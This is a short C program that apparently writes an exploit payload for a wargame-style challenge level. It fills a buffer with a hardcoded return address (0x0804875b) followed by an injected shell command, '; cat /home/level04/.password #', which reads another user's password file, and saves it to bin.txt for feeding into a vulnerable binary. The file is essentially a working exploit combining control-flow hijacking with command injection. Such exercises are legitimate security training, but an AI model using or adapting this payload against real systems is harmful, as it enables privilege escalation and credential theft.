#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>

#define ADDR 0x0804875b

int main(int argc, char **argv)
{
  char buf[64];
  char cmd[64] = "____; cat /home/level04/.password #";
  int len = strlen(cmd);
  FILE *fp = fopen("bin.txt", "wb");
  int i;

  memset(buf, 0, 64);
  memcpy(buf, cmd, len);
  ((int *)buf)[0] = ADDR;

  fwrite(buf, 1, 64, fp);
  fclose(fp);
}
